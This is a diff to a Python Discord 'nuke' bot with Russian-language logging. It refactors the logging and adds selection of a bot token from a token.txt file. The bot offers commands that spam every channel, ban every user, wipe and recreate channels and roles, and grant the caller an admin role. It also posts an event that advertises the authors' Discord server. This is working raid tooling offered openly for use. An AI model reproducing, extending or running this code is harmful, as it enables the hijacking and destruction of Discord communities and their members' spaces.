@@ -39,6 +39,7 @@ def draw_menu():
 !spam - спам во всех каналах       !allban - банит всех пользователей
     ''', Fore.RESET)
     
+    
 def log(operators, message):
 
     match operators:
@@ -59,6 +60,7 @@ def load_tokens():
     with open("token.txt", "r") as f:
         return [line.strip() for line in f.readlines() if line.strip()]
 
+
 def select_token(tokens):
     print("Выберите токен:")
     for idx, token in enumerate(tokens):
@@ -73,6 +75,7 @@ def select_token(tokens):
     except:
         print("Неверный ввод.")
         return None
+
 
 @bot.event
 async def on_ready():
@@ -159,7 +162,7 @@ async def create_roles(guild):
 async def nuke(ctx):
     await ctx.message.delete()
     guild = ctx.guild
-    print(Fore.YELLOW + "[~] Выполняется !nuke")
+    log('~', "Выполняется краш сервера...")
 
         
     async with async_open(ICON_PATH, "rb") as icon:
@@ -172,17 +175,17 @@ async def nuke(ctx):
     try:
         event = await guild.create_scheduled_event(
             name="ICSU links",
-            description="Discord: https://discord.gg/jPzvYYjRSd\nYouTube: https://www.youtube.com/@icsunew\nGitHub: https://github.com/xnnder",
+            description="Discord: https://discord.gg/Cju3qReNWy\nYouTube: https://www.youtube.com/@icsunew\nGitHub: https://github.com/sourcenoob",
             start_time=start_time,
             end_time=end_time,
             entity_type=discord.EntityType.external,
-            location="https://discord.gg/jPzvYYjRSd",
+            location="https://discord.gg/Cju3qReNWy",
             privacy_level=discord.PrivacyLevel.guild_only,
         )
     except discord.Forbidden:
-        await ctx.send(Fore.RED +"У бота нет прав на создание событий.")
+        log('-', "У бота нет прав на создание событий.")
     except Exception as e:
-        await ctx.send(Fore.RED + f"Ошибка при создании события: {e}")
+        log('-', f"Ошибка при создании события: {e}")
 
     asyncio.gather(
         wipe_channels(guild),
@@ -190,12 +193,6 @@ async def nuke(ctx):
         delete_roles(guild),
         create_roles(guild)
         )
-    
-
-    await asyncio.sleep(10)
-
-    print(Fore.GREEN + "[+] Краш завершен.")
-
 
 @bot.event
 async def on_guild_channel_create(channel):
@@ -206,7 +203,7 @@ async def on_guild_channel_create(channel):
 @bot.command()
 async def admin(ctx):
     await ctx.message.delete()
-    print(Fore.YELLOW + "[~] Выполняется !admin")
+    log('~', "Выполняется создание роли...")
 
     guild = ctx.guild
     role_name = "ICSU ADMIN"
@@ -218,9 +215,13 @@ async def admin(ctx):
         )
 
     await ctx.author.add_roles(role)
-    print(Fore.GREEN + f"[+] Выдана роль {role_name} пользователю {ctx.author}")
+    log('+', f"Выдана роль {role_name} пользователю {ctx.author}")
 
 
 
-bot.run(TOKEN, log_handler=None)
-
+if __name__ == "__main__":
+    tokens = load_tokens()
+    if not tokens:
+        exit("Нет токенов")
+    token = select_token(tokens)
+    bot.run(token, log_handler=None)
